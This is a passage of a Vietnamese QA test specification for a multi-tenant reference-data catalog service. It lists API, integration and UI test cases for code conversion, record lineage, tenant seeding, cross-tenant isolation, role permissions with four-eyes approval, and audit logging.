- **Loại** Dương · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-046 · API-07-051
- **Tiền điều kiện / dữ liệu** Mục 2.4.
- **Bước**
  1. `direction = NEW_TO_OLD`, `at = 2026-06-01`, `codes = [{"code":"99201","asOf":"2024-06-01"}]`.
- **Mong đợi** `AMBIGUOUS` với `candidates` = `99003` (ghi chú "một phần"), `99005`.

#### TC-07-208 · Giới hạn lô và không có phiên bản tại thời điểm
- **Loại** Âm, Biên · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-046 · ERR-07-006, 026
- **Tiền điều kiện / dữ liệu** —
- **Bước**
  1. Gửi 1.000 mã (biên), rồi 1.001 mã.
  2. Gửi `at = 2019-01-01` (trước v1).
- **Mong đợi** 1.000 mã trả `200` với p95 ≤ 300 ms ở môi trường PERF; 1.001 mã `400` `ERR-07-026`. Bước 2 `404` `ERR-07-006`.

#### TC-07-209 · Chuyển mã bằng tệp trên giao diện
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** E2E
- **Truy vết** FR-07-046 · UI-07-11 · FR-07-024
- **Tiền điều kiện / dữ liệu** F-DVHC-CONV; U-T68-VW.
- **Bước**
  1. Mở UI-07-11 tab "Chuyển mã", tải F-DVHC-CONV, chọn ngày đích 2026-06-01, bấm "Chuyển mã".
  2. Khi tác vụ xong, tải tệp kết quả.
- **Mong đợi** Tác vụ nhập `mode = ADMIN_UNIT_CONVERT` đi hết hai pha; tệp kết quả cùng định dạng, thêm cột "Mã mới", "Tên mới", "Trạng thái", "Ứng viên"; số dòng bằng tệp vào; tệp hết hạn tải sau 24 giờ. Danh mục `DVHC` không thay đổi.

#### TC-07-210 · Tra theo thời điểm qua các phiên bản
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-044 · FR-07-026 · API-07-026, 044
- **Tiền điều kiện / dữ liệu** Mục 2.4.
- **Bước**
  1. `GET /catalogs/DVHC/tree?at=2024-06-01&root=97`.
  2. `GET /catalogs/DVHC/tree?at=2026-06-01&root=97`.
- **Mong đợi** Bước 1 trả cây ba cấp (tỉnh, huyện `971`, `972`, xã). Bước 2 trả cây hai cấp (tỉnh, xã) đúng các mã của v3.

#### TC-07-211 · Dòng lịch sử của một bản ghi
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-047 · API-07-050 · UI-07-11
- **Tiền điều kiện / dữ liệu** Mục 2.4.
- **Bước**
  1. `GET /catalogs/DVHC/items/99101/lineage`.
  2. Mở UI-07-11, chọn `99101`, xem dòng thời gian.
- **Mong đợi** Bước 1 trả hai khoảng tồn tại (2025-07-01…2026-01-01 tên cũ, từ 2026-01-01 tên mới), sự kiện vào `MERGE` từ `99001`, `99002`, sự kiện `RENAME`. Bước 2 hiển thị dòng thời gian và bảng thay thế đọc được bằng trình đọc màn hình (mục 20 của D03-06-PH07).

#### TC-07-212 · Dòng lịch sử với mã không tồn tại hoặc danh mục hạn chế
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-047 · ERR-07-001, 007, 030
- **Tiền điều kiện / dữ liệu** APP-T68-READ.
- **Bước**
  1. Lineage của `DVHC/12345`.
  2. Lineage của `KHONG_CO/01`.
  3. Lineage của một bản ghi `TRAM_QUAN_TRAC`.
- **Mong đợi** `404` `ERR-07-007`; `404` `ERR-07-001`; `403` `ERR-07-030`.

#### TC-07-213 · Dòng lịch sử của danh mục thường suy từ mã thay thế
- **Loại** Dương · **Ưu tiên** P3 · **Tự động** API
- **Truy vết** FR-07-047 · API-07-050
- **Tiền điều kiện / dữ liệu** CAT-LH: v2 ngừng dùng `KH01.L03` với `replacedBy = KH01.L04` (tạo trong ca, chạy tuần tự).
- **Bước**
  1. Lineage của `LOAI_HINH_TC/KH01.L03`.
- **Mong đợi** Trả khoảng tồn tại tới ngày hiệu lực của v2 và một sự kiện ra loại `REPLACED` trỏ `KH01.L04`, `derived = true`.

### TS-07-18 · Danh mục COMMON, PLATFORM và nạp gói nền

**Mục tiêu.** Xác nhận danh mục toàn quốc chỉ do tenant `PLATFORM` ghi, mọi tỉnh đọc được, tỉnh mở rộng được bằng HYBRID trong dải mã riêng, và tenant mới nhận gói danh mục nền đầy đủ, chạy lại không sinh trùng. Thay mô hình "mỗi tỉnh một bản sao" của Aita (LGC-DMDC-017).

**Phủ.** FR-07-048, 049; BR-07-001, 010, 011; API-07-073; ERR-07-003, 008, 012, 019, 022, 045, 047, 048.

#### TC-07-214 · Tỉnh đọc COMMON, không ghi được
- **Loại** Dương, Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-048 · BR-07-001 · ERR-07-003 · LGC-DMDC-017
- **Tiền điều kiện / dữ liệu** CAT-GT (COMMON).
- **Bước**
  1. U-T68-VW `GET /catalogs/GIOI_TINH/items`.
  2. U-T68-TA tạo bản nháp `GIOI_TINH`.
  3. U-T68-TA sửa thông tin `GIOI_TINH`.
- **Mong đợi** Bước 1 `200`, 3 bản ghi, `scope = COMMON`. Bước 2, 3 `403` `ERR-07-003`. KT: không cho bước 1; nhật ký an ninh ghi bước 2, 3.

#### TC-07-215 · PLATFORM ghi COMMON, mọi tenant thấy phiên bản mới
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-048 · EVT-07-05
- **Tiền điều kiện / dữ liệu** Danh mục `TC215_COMMON` tạo bởi U-PA.
- **Bước**
  1. U-PA tạo, thêm 2 bản ghi, trình; U-PA2 duyệt và phát hành.
  2. U-T68-VW và U-T01-DS đọc `TC215_COMMON`.
- **Mong đợi** Bước 2: cả hai tenant nhận cùng 2 bản ghi; bộ đệm L2 dùng khóa của `COMMON`, không nhân bản theo tenant.

#### TC-07-216 · HYBRID: bổ sung trong dải mã địa phương
- **Loại** Dương, Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-048 · BR-07-010 · ERR-07-008, 012
- **Tiền điều kiện / dữ liệu** CAT-DT68 (`^68\.[0-9]{2}$`).
- **Bước**
  1. U-T68-TA thêm bản ghi `68.03` vào bản nháp `DAN_TOC_T68`.
  2. Thêm bản ghi `56`.
  3. Thêm bản ghi `01` (trùng mã gốc).
- **Mong đợi** Bước 1 `201`. Bước 2 `422` `ERR-07-012`. Bước 3 `409` `ERR-07-008`.

#### TC-07-217 · Nạp gói danh mục nền cho tenant mới
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, IT
- **Truy vết** FR-07-049 · API-07-073 · BR-07-011
- **Tiền điều kiện / dữ liệu** Tenant `T99` vừa tạo ở PH-20 (`PROVISIONING`); gói nền chuẩn `seed-2026.11` gồm 12 danh mục.
- **Bước**
  1. Client PH-20 gọi `POST /api/platform/rdm/v1/tenants/T99:seed` với `Idempotency-Key`.
  2. Thăm dò tới khi xong.
- **Mong đợi** `202`; T99 có 12 danh mục, mỗi danh mục một phiên bản `PUBLISHED`, `origin = SEED`, `effectiveFrom` theo BR-07-011; bucket `dh-t99-rdm` có ảnh chụp; EVT-07-01 và EVT-07-05 phát trên topic `t99.*`.

#### TC-07-218 · Chạy lại nạp gói, gói hỏng, tenant sai trạng thái
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-049 · ERR-07-019, 022, 045, 048
- **Tiền điều kiện / dữ liệu** T99 đã nạp ở TC-07-217.
- **Bước**
  1. Gọi lại với cùng `Idempotency-Key`, cùng thân.
  2. Gọi với cùng khóa, thân khác gói.
  3. Gọi với gói có tệp băm SHA-256 sai.
  4. Gọi cho `T404` không tồn tại.
  5. Gọi cho tenant `SUSPENDED`.
- **Mong đợi** Bước 1 trả kết quả cũ, không tạo thêm danh mục. Bước 2 `409` `ERR-07-022`. Bước 3 `422` `ERR-07-019`, không có danh mục nào được tạo (tất cả hoặc không). Bước 4 `404` `ERR-07-045`. Bước 5 `409` `ERR-07-048`.

#### TC-07-219 · Nạp gói khi kho đối tượng chưa sẵn sàng
- **Loại** Khả dụng, Âm · **Ưu tiên** P2 · **Tự động** IT, Chaos
- **Truy vết** FR-07-049 · ERR-07-047
- **Tiền điều kiện / dữ liệu** MinIO (thay Garage) dừng.
- **Bước**
  1. Gọi nạp gói cho `T98`.
  2. Khởi động lại MinIO, gọi lại với cùng `Idempotency-Key`.
- **Mong đợi** Bước 1 `503` `ERR-07-047` có `Retry-After`, không để lại danh mục dở dang. Bước 2 thành công như TC-07-217.

### TS-07-19 · Rò rỉ chéo tenant trên mọi nhóm API

**Mục tiêu.** Chứng minh không có đường nào để một tenant đọc, ghi hoặc suy ra dữ liệu của tenant khác, theo FR-00-011 và D03-10 §6. Mọi ca mang thẻ `tenant-leak` và là điều kiện ra bắt buộc 100% (mục 1.5). Mỗi ca dùng cặp T68 và T01 có danh mục trùng mã `LOAI_HINH_TC` với nội dung khác nhau (CAT-LH, CAT-LH01), nên trả nhầm tenant sẽ lộ ngay qua hậu tố "(T01)".

**Phủ.** FR-00-011; mọi nhóm API-07; RLS `ph07_rdm`; bộ đệm L1, L2; kho đối tượng; Kafka.

**Tiền điều kiện chung.** Bộ dữ liệu chuẩn; vai trò kết nối `dh_data_app` không có `BYPASSRLS`. Mọi phản hồi từ chối là `404-ẩn` hoặc `403-PQ`, không phân biệt "không tồn tại" và "thuộc tenant khác".

#### TC-07-220 · Đọc danh mục và bản ghi của tenant khác
- **Loại** Bảo mật, Âm · **Ưu tiên** P1 · **Tự động** API · thẻ `tenant-leak`
- **Truy vết** FR-00-011 · FR-07-002, 026 · API-07-003, 026
- **Tiền điều kiện / dữ liệu** U-T01-DS; danh mục `TRAM_QUAN_TRAC` chỉ có ở T68.
- **Bước**
  1. U-T01-DS gọi `GET /catalogs/TRAM_QUAN_TRAC`.
  2. U-T01-DS gọi `GET /catalogs/LOAI_HINH_TC/items`.
- **Mong đợi** Bước 1 `404-ẩn` `ERR-07-001`. Bước 2 trả dữ liệu của T01 (tên có hậu tố "(T01)"), không có bản ghi nào của T68.

#### TC-07-221 · Truy cập phiên bản, bản ghi bằng định danh nội bộ của tenant khác
- **Loại** Bảo mật, Âm · **Ưu tiên** P1 · **Tự động** API · thẻ `tenant-leak`
- **Truy vết** FR-00-011 · API-07-011, 027
- **Tiền điều kiện / dữ liệu** Mã UUID của phiên bản v1 CAT-LH (T68) lấy từ CSDL.
- **Bước**
  1. U-T01-DS gọi các API nhận `versionRef` bằng UUID của T68.
  2. U-T01-DS gọi `GET /import-jobs/{jobId của T68}`, `GET /export-jobs/{jobId của T68}`, `GET /sync-runs/{runId của PLATFORM}`.
- **Mong đợi** Mọi lời gọi `404-ẩn`, thời gian phản hồi không khác biệt có ý nghĩa thống kê so với định danh ngẫu nhiên (kiểm 50 lần, chênh trung vị < 20 ms) để không suy ra được sự tồn tại.

#### TC-07-222 · Ghi vào danh mục của tenant khác
- **Loại** Bảo mật, Âm · **Ưu tiên** P1 · **Tự động** API · thẻ `tenant-leak`
- **Truy vết** FR-00-011 · API-07-004, 012, 028, 031
- **Tiền điều kiện / dữ liệu** U-T01-TA.
- **Bước**
  1. Sửa thông tin `TRAM_QUAN_TRAC`; tạo bản nháp; thêm bản ghi; nhập lô với UUID phiên bản của T68.
- **Mong đợi** Mọi lời gọi `404-ẩn`; số dòng trong các bảng của T68 không đổi; KT: không ghi gì cho T68.

#### TC-07-223 · RLS chặn ngay cả khi tầng ứng dụng sai
- **Loại** Bảo mật · **Ưu tiên** P1 · **Tự động** IT · thẻ `tenant-leak`
- **Truy vết** FR-00-011 · D03-03-PH07 §1 · D03-10 §6
- **Tiền điều kiện / dữ liệu** IT kết nối bằng `dh_data_app`, đặt `app.tenant_id = 'T01'`.
- **Bước**
  1. Chạy `SELECT count(*)` trên mọi bảng có `tenant_id` của `ph07_rdm`.
  2. Chạy `UPDATE ph07_rdm.catalog SET name = 'x' WHERE tenant_id = 'T68'`.
  3. Không đặt `app.tenant_id` rồi chạy `SELECT` bất kỳ.
- **Mong đợi** Bước 1 chỉ đếm dòng của T01 và COMMON (bảng mẫu S, P). Bước 2 cập nhật 0 dòng. Bước 3 báo lỗi `unrecognized configuration parameter` (do `current_setting(..., false)`), không trả dữ liệu.

#### TC-07-224 · Vai trò worker chỉ thấy cột hàng đợi
- **Loại** Bảo mật · **Ưu tiên** P1 · **Tự động** IT · thẻ `tenant-leak`
- **Truy vết** FR-00-011 · D03-03-PH07 §3.8 · D03-02-PH07 §4.4
- **Tiền điều kiện / dữ liệu** Có tác vụ nhập `UPLOADED` ở T68 và T01.
- **Bước**
  1. `SET LOCAL ROLE ph07_worker; SET LOCAL app.tenant_id = 'PLATFORM'`; chọn các cột hàng đợi.
  2. Cùng phiên, chọn cột `file_id` hoặc `summary`.
  3. Cùng phiên, cập nhật `status`.
- **Mong đợi** Bước 1 thấy tác vụ của cả hai tenant, chỉ các cột `id`, `tenant_id`, `job_type`, `status`, `lease_owner`, `lease_until`, `created_at`. Bước 2, 3 báo `permission denied`.

#### TC-07-225 · Bộ đệm không trả nhầm tenant
- **Loại** Bảo mật · **Ưu tiên** P1 · **Tự động** IT · thẻ `tenant-leak`
- **Truy vết** FR-00-011 · FR-07-028 · NFR-07-009
- **Tiền điều kiện / dữ liệu** Valkey và Caffeine trống.
- **Bước**
  1. APP-T68-READ gọi `GET /catalogs/LOAI_HINH_TC/items/KH01` (nạp đệm).
  2. Ngay sau đó APP-T01-READ gọi cùng đường dẫn trên cùng bản sao `dh-data`.
  3. Liệt kê khóa Valkey.
- **Mong đợi** Bước 2 trả bản ghi của T01. Bước 3 mọi khóa có tiền tố tenant (`rdm:T68:...`, `rdm:T01:...`); không có khóa thiếu tenant trừ khóa `rdm:COMMON:...`.

#### TC-07-226 · Ảnh chụp và URL ký sẵn của tenant khác
- **Loại** Bảo mật, Âm · **Ưu tiên** P1 · **Tự động** API · thẻ `tenant-leak`
- **Truy vết** FR-00-011 · FR-07-028 · API-07-049
- **Tiền điều kiện / dữ liệu** URL ký sẵn ảnh chụp v1 CAT-LH của T68.
- **Bước**
  1. APP-T01-READ gọi `GET /catalogs/TRAM_QUAN_TRAC/snapshots/1`.
  2. Dùng khóa truy cập của bucket `dh-t01-rdm` đọc đối tượng trong `dh-t68-rdm`.
  3. Dùng URL ký sẵn sau 16 phút.
- **Mong đợi** Bước 1 `404-ẩn`. Bước 2 `AccessDenied`. Bước 3 `403` (URL hết hạn sau 15 phút).

#### TC-07-227 · Tệp xuất, tệp nhập của tenant khác
- **Loại** Bảo mật, Âm · **Ưu tiên** P1 · **Tự động** API · thẻ `tenant-leak`
- **Truy vết** FR-00-011 · FR-07-021, 024 · API-07-034, 039
- **Tiền điều kiện / dữ liệu** Tác vụ xuất `COMPLETED` của T68.
- **Bước**
  1. U-T01-TA gọi `GET /export-jobs/{id}` và đường dẫn tải tệp.
  2. U-T01-TA gọi `GET /import-jobs/{id}/rows` với tác vụ nhập của T68.
- **Mong đợi** Mọi lời gọi `404-ẩn`.

#### TC-07-228 · Truy vấn DSL, tìm kiếm, cây không vượt tenant
- **Loại** Bảo mật · **Ưu tiên** P1 · **Tự động** API · thẻ `tenant-leak`
- **Truy vết** FR-00-011 · FR-07-030, 032 · API-07-044, 045, 047
- **Tiền điều kiện / dữ liệu** APP-T01-READ được cấp `rdm.query` trong ca.
- **Bước**
  1. Gọi `items:query` không lọc trên `LOAI_HINH_TC`.
  2. Gọi `items:search?q=khoi`.
  3. Gọi `tree`.
- **Mong đợi** Mọi kết quả chỉ có bản ghi "(T01)".

#### TC-07-229 · Ánh xạ và hệ thống mã của tenant khác
- **Loại** Bảo mật, Âm · **Ưu tiên** P1 · **Tự động** API · thẻ `tenant-leak`
- **Truy vết** FR-00-011 · FR-07-040…042
- **Tiền điều kiện / dữ liệu** `CS-BHXH-DT` chỉ có ở T68.
- **Bước**
  1. APP-T01-READ gọi `mappings:translate` với `codeSystem = CS-BHXH-DT`.
  2. U-T01-TA gọi `GET /code-systems/CS-BHXH-DT`.
- **Mong đợi** `404` `ERR-07-045` cho cả hai.

#### TC-07-230 · Lịch sử kiểm toán không lộ tenant khác
- **Loại** Bảo mật · **Ưu tiên** P1 · **Tự động** API · thẻ `tenant-leak`
- **Truy vết** FR-00-011 · FR-07-050 · API-07-072
- **Tiền điều kiện / dữ liệu** U-T01-DS (vai trò AU thử thêm U-T01-AU).
- **Bước**
  1. `GET /catalogs/LOAI_HINH_TC/history`.
- **Mong đợi** Chỉ có mục của T01; không có `actor` thuộc realm `t68`.

#### TC-07-231 · Tiêu đề tenant giả mạo
- **Loại** Bảo mật, Âm · **Ưu tiên** P1 · **Tự động** API · thẻ `tenant-leak`
- **Truy vết** FR-00-011 · D03-10 §6
- **Tiền điều kiện / dữ liệu** Token của U-T01-DS.
- **Bước**
  1. Gửi thêm tiêu đề `X-Tenant-Id: T68` và tham số `?tenant=T68`.
  2. Gửi token có claim `tenant = T68` nhưng ký bằng khóa không hợp lệ.
- **Mong đợi** Bước 1: tiêu đề và tham số bị bỏ qua, dữ liệu trả về là của T01. Bước 2 `401` `ERR-07-041`.

#### TC-07-232 · Đồng thời hai tenant trên cùng luồng xử lý
- **Loại** Bảo mật · **Ưu tiên** P1 · **Tự động** IT · thẻ `tenant-leak`
- **Truy vết** FR-00-011 · D03-02-PH07 §6
- **Tiền điều kiện / dữ liệu** Một bản sao `dh-data`, pool 4 kết nối, luồng ảo bật.
- **Bước**
  1. Gửi xen kẽ 2.000 yêu cầu của T68 và T01 trong 30 giây với 64 luồng song song.
- **Mong đợi** Mọi phản hồi khớp tenant của token (kiểm theo hậu tố "(T01)"); `app.tenant_id` được đặt lại mỗi giao dịch (kiểm bằng nhật ký `TenantAwareTransactionManager` ở mức DEBUG trong IT).

#### TC-07-233 · Tác vụ nền giữ đúng tenant
- **Loại** Bảo mật · **Ưu tiên** P1 · **Tự động** IT · thẻ `tenant-leak`
- **Truy vết** FR-00-011 · FR-07-021, 036
- **Tiền điều kiện / dữ liệu** Một tác vụ nhập T68, một tác vụ nhập T01 cùng lúc; worker lấy cả hai.
- **Bước**
  1. Chạy hai tác vụ tới `COMMITTED`.
- **Mong đợi** Mỗi tác vụ ghi vào đúng bản nháp của tenant mình; sự kiện EVT-07-07 nằm trên đúng topic `t68.*`, `t01.*`; tệp tạm nằm đúng bucket.

### TS-07-20 · Ma trận phân quyền, bốn mắt, phạm vi tổ chức và scope máy

**Mục tiêu.** Kiểm mỗi ô của ma trận PERM-07 × vai trò ở D02-08 §3.1 bằng ít nhất một ca, kể cả ô "○" (chỉ trong tổ chức của mình) và nguyên tắc bốn mắt. Phần lớn ca chạy dạng bảng tham số (một phương thức kiểm thử, nhiều dòng dữ liệu).

**Phủ.** FR-00-071; D02-08 §3.1; BR-07-011 (bốn mắt); ERR-07-015, 046.

#### TC-07-234 · Quyền xem của mọi vai trò
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API (tham số)
- **Truy vết** D02-08 · PERM-07-read · API-07-001, 003
- **Tiền điều kiện / dữ liệu** Mọi người dùng ở mục 2.2.
- **Bước**
  1. Mỗi người dùng gọi `GET /catalogs` và `GET /catalogs/LOAI_HINH_TC`.
- **Mong đợi** Mọi vai trò có `PERM-07-read` nhận `200`.

#### TC-07-235 · Quyền soạn chỉ có ở TA, DS (trong tổ chức) và PA (COMMON)
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API (tham số)
- **Truy vết** D02-08 · PERM-07-create, update · API-07-002, 004
- **Tiền điều kiện / dữ liệu** U-T68-VW, AU, IE, SV, DEV, DA1.
- **Bước**
  1. Mỗi người dùng tạo danh mục `TC235_{vai trò}`.
- **Mong đợi** Mọi lời gọi `403-PQ`; không có danh mục nào được tạo.

#### TC-07-236 · DS chỉ sửa danh mục thuộc tổ chức của mình
- **Loại** Dương, Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** D02-08 (ô ○) · PERM-07-update · ERR-07-046
- **Tiền điều kiện / dữ liệu** CAT-LH thuộc ORG-SNV.
- **Bước**
  1. U-T68-DS-NV tạo bản nháp CAT-LH.
  2. U-T68-DS-MT thêm bản ghi vào bản nháp đó.
  3. U-T68-DS-MT tạo danh mục mới với `ownerOrgId = ORG-SNV`.
- **Mong đợi** Bước 1 `201`. Bước 2 `403` `ERR-07-046`. Bước 3 `403` `ERR-07-046` (DS chỉ đặt chủ quản là tổ chức của mình).

#### TC-07-237 · Quyền trình duyệt
- **Loại** Dương, Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** D02-08 · PERM-07-submit · API-07-017
- **Tiền điều kiện / dữ liệu** Bản nháp của CAT-LH.
- **Bước**
  1. U-T68-VW trình.
  2. U-T68-DS-MT trình.
  3. U-T68-DS-NV trình.
- **Mong đợi** Bước 1 `403-PQ`; bước 2 `403` `ERR-07-046`; bước 3 `200`.

#### TC-07-238 · Chỉ DA (và PA với COMMON) duyệt, phát hành
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API (tham số)
- **Truy vết** D02-08 · PERM-07-publish · API-07-018, 020
- **Tiền điều kiện / dữ liệu** Phiên bản `IN_REVIEW` của CAT-LH do U-T68-DS-NV trình.
- **Bước**
  1. U-T68-TA, DS-NV, IE, VW lần lượt gọi duyệt.
- **Mong đợi** Mọi lời gọi `403-PQ`; phiên bản vẫn `IN_REVIEW`.

#### TC-07-239 · Bốn mắt: người trình không tự duyệt
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** BR-07-011 · FR-07-015 · ERR-07-015
- **Tiền điều kiện / dữ liệu** U-T68-DA2 vừa có quyền soạn vừa có quyền duyệt.
- **Bước**
  1. U-T68-DA2 soạn và trình bản nháp CAT-LH.
  2. U-T68-DA2 duyệt.
  3. U-T68-DA1 duyệt.
- **Mong đợi** Bước 2 `403` `ERR-07-015`. Bước 3 `200`.

#### TC-07-240 · Bốn mắt tính cả người sửa bản nháp
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** BR-07-011 · ERR-07-015
- **Tiền điều kiện / dữ liệu** U-T68-DS-NV soạn, U-T68-DA2 sửa một bản ghi, U-T68-DS-NV trình.
- **Bước**
  1. U-T68-DA2 duyệt.
- **Mong đợi** `403` `ERR-07-015` (người đã sửa nội dung bản nháp cũng không được duyệt).

#### TC-07-241 · Bốn mắt khi thu hồi duyệt và phát hành
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** BR-07-011 · FR-07-015, 016
- **Tiền điều kiện / dữ liệu** Phiên bản `APPROVED` bởi U-T68-DA1.
- **Bước**
  1. U-T68-DA2 (người soạn) phát hành.
  2. U-T68-DA1 thu hồi duyệt (`UNAPPROVE`).
- **Mong đợi** Bước 1 `403` `ERR-07-015`. Bước 2 `200`, phiên bản về `IN_REVIEW`.

#### TC-07-242 · Quyền xuất của mọi vai trò
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** API (tham số)
- **Truy vết** D02-08 · PERM-07-export · API-07-038
- **Tiền điều kiện / dữ liệu** Mọi người dùng T68.
- **Bước**
  1. Mỗi người dùng xuất CAT-MUC dạng CSV.
- **Mong đợi** Mọi lời gọi `200` hoặc `202`.

#### TC-07-243 · Quyền đồng bộ
- **Loại** Dương, Âm · **Ưu tiên** P1 · **Tự động** API (tham số)
- **Truy vết** D02-08 · PERM-07-sync · API-07-058, 061
- **Tiền điều kiện / dữ liệu** Nguồn `SRC-TG` của `TON_GIAO` ở T68 (TC-07-187).
- **Bước**
  1. U-T68-TA, DA1 chạy đồng bộ; U-T68-DS-NV, VW chạy đồng bộ.
- **Mong đợi** TA, DA1 `202`; DS-NV, VW `403-PQ` (theo D02-08, Q07-68 ở D03-06-PH07).

#### TC-07-244 · Xác nhận đồng bộ kèm phát hành cần quyền phát hành
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-037 · PERM-07-sync, publish
- **Tiền điều kiện / dữ liệu** Lần chạy `PENDING_CONFIRMATION` ở T68.
- **Bước**
  1. U-T68-TA xác nhận.
  2. U-T68-DA1 xác nhận.
- **Mong đợi** Bước 1 `403-PQ` (TA không có `PERM-07-publish`). Bước 2 `200`.

#### TC-07-245 · Quyền ánh xạ
- **Loại** Dương, Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-041 · PERM-07-mapping (đề xuất)
- **Tiền điều kiện / dữ liệu** —
- **Bước**
  1. U-T68-IE, TA, DS-NV ghi ánh xạ; U-T68-VW, DA1 ghi ánh xạ.
- **Mong đợi** IE, TA, DS-NV `200`; VW, DA1 `403-PQ`.

#### TC-07-246 · Quyền cấp quyền khai thác
- **Loại** Dương, Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-052 · PERM-07-grant (đề xuất)
- **Tiền điều kiện / dữ liệu** CAT-RES.
- **Bước**
  1. U-T68-TA thay danh sách cấp quyền của CAT-RES.
  2. U-T68-DS-NV làm như trên.
- **Mong đợi** Bước 1 `200`; bước 2 `403-PQ`.

#### TC-07-247 · Quyền cấu hình tham số
- **Loại** Dương, Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-053 · PERM-07-configure (đề xuất)
- **Tiền điều kiện / dữ liệu** —
- **Bước**
  1. U-T68-TA đổi `07.rdm.import-preview-ttl-hours`.
  2. U-T68-DA1 đổi cùng tham số.
- **Mong đợi** Bước 1 `200`; bước 2 `403-PQ`.

#### TC-07-248 · Quyền xem lịch sử của AU
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-050 · ROLE-AUDITOR
- **Tiền điều kiện / dữ liệu** Danh mục `DM_THU_NGHIEM` đã xóa mềm 5 ngày trước.
- **Bước**
  1. U-T68-AU gọi lịch sử của `DM_THU_NGHIEM`.
  2. U-T68-VW gọi như trên.
- **Mong đợi** Bước 1 `200`; bước 2 `404` `ERR-07-001`.

#### TC-07-249 · PA không ghi danh mục của tỉnh
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** D02-08 · BR-07-001
- **Tiền điều kiện / dữ liệu** U-PA.
- **Bước**
  1. U-PA sửa CAT-LH của T68 (đường dẫn của tenant T68).
- **Mong đợi** `404-ẩn` (PA làm việc trong tenant PLATFORM, không có quyền vào dữ liệu của tỉnh).

#### TC-07-250 · PO chỉ đọc
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** D02-08 · ROLE-PLATFORM_OPERATOR
- **Tiền điều kiện / dữ liệu** U-PO.
- **Bước**
  1. U-PO đọc `GIOI_TINH`; tạo bản nháp `GIOI_TINH`.
- **Mong đợi** Đọc `200`; tạo bản nháp `403-PQ`.

#### TC-07-251 · Scope máy rdm.read không ghi được
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-00-071 · API-07-031
- **Tiền điều kiện / dữ liệu** APP-T68-READ.
- **Bước**
  1. Nhập lô vào bản nháp CAT-LH.
- **Mong đợi** `403-PQ`.

#### TC-07-252 · Scope rdm.write chỉ ghi vào bản nháp
- **Loại** Dương, Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-023 · API-07-031, 017, 020
- **Tiền điều kiện / dữ liệu** APP-T68-WRITE.
- **Bước**
  1. Nhập lô 10 bản ghi vào bản nháp CAT-LH.
  2. Trình duyệt; phát hành.
- **Mong đợi** Bước 1 `200`. Bước 2 `403-PQ` cho cả hai (máy không trình, không phát hành).

#### TC-07-253 · Client không có scope rdm
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-00-071
- **Tiền điều kiện / dữ liệu** APP-T68-NOSCOPE.
- **Bước**
  1. `GET /catalogs`.
- **Mong đợi** `403-PQ` từ APISIX hoặc từ PH-07; không có dữ liệu.

#### TC-07-254 · Token hết hạn, thiếu token
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** ERR-07-041
- **Tiền điều kiện / dữ liệu** Token hết hạn 1 giây.
- **Bước**
  1. Gọi `GET /catalogs` với token hết hạn; không có token.
- **Mong đợi** `401` `ERR-07-041` cho cả hai, có tiêu đề `WWW-Authenticate`.

#### TC-07-255 · Giao diện ẩn hoặc vô hiệu nút theo quyền
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** E2E
- **Truy vết** D02-08 · UI-07-01, 02, 07 · D03-06-PH07 mục 23.1
- **Tiền điều kiện / dữ liệu** U-T68-VW, U-T68-DS-MT, U-T68-DA2.
- **Bước**
  1. U-T68-VW mở UI-07-01, UI-07-02 của CAT-LH.
  2. U-T68-DS-MT mở UI-07-02 của CAT-LH.
  3. U-T68-DA2 mở UI-07-07 của bản nháp chính mình đã trình.
- **Mong đợi** Bước 1 không có nút "Tạo danh mục", "Mở bản nháp". Bước 2 nút "Mở bản nháp" vô hiệu, di chuột hiện lý do "Danh mục thuộc Sở Nội vụ". Bước 3 nút "Duyệt" vô hiệu với lý do "Bạn đã trình hoặc sửa bản nháp này".

### TS-07-21 · Kiểm toán và lịch sử

**Mục tiêu.** Xác nhận mọi thao tác ghi sinh bản ghi kiểm toán đủ trường, lịch sử gộp được hai nguồn, và nội dung danh mục hạn chế được che với người không đủ quyền.

**Phủ.** FR-07-050; FR-00-040…042; API-07-072; ERR-07-001, 009, 047.

#### TC-07-256 · Mọi thao tác ghi đều có bản ghi kiểm toán
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** IT
- **Truy vết** FR-07-050 · FR-00-041
- **Tiền điều kiện / dữ liệu** Bộ tiêu thụ thử đọc luồng kiểm toán gửi PH-13.
- **Bước**
  1. Thực hiện chuỗi: tạo danh mục, thêm thuộc tính, thêm bản ghi, trình, rút lại, trình, duyệt, phát hành, ngừng hiệu lực.
